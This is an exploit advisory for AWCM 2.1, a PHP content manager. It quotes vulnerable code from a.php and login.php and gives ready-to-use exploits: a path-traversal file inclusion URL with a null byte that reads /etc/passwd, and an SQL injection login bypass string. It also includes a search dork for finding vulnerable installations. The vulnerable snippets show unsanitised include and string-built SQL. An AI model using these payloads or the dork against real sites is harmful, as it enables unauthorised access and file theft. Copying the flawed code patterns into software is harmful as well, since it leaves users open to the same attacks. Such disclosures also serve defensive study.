AWCM 2.1 Local File Inclusion / Auth Bypass Vulnerabilities
===========================================================


#----------------------------------------------------------------------------------------------------------------
Script : AWCM
version : v2.1
Language:PHP
Demo : http://awcm.sourceforge.net/
Download : http://awcm.sourceforge.net/ar/down_pro.php?id=30
Dork: intext:Powered by AWCM v2.1
Found by :SwEET-DeViL

need magic_quotes_gpc = Off

#----------------------------------------------------------------------------------------------------------------
::: Local File Disclosure Vulnerability :::
)=> a.php
.................................................................................................................
if (isset($_GET[&#039;a&#039;])) {
    $a = $_GET[&#039;a&#039;];  <======================================:{
    if (file_exists("addons/$a/index.php")) {
        include ("addons/$a/index.php");
    }
.................................................................................................................
#Exploit:

http://www.site.com/a.php?a=../../../../../../../../etc/passwd%00

##############################################################################
::: Auth Bypass SQL Injection  Vulnerability :::

)=> login.php  AND  control/login.php

.................................................................................................................
if(isset($_GET[&#039;do&#039;])) {
$user = $_POST[&#039;username&#039;];  <======================================:{
$pass = md5($_POST[&#039;password&#039;]);

$cp_login_query = mysql_query("SELECT id,username,password,level FROM awcm_members WHERE level = &#039;admin&#039; AND username = &#039;$user&#039; AND password = &#039;$pass&#039;");
.................................................................................................................
#Exploit:

put as username : &#039;or 1=1/*

##############################################################################




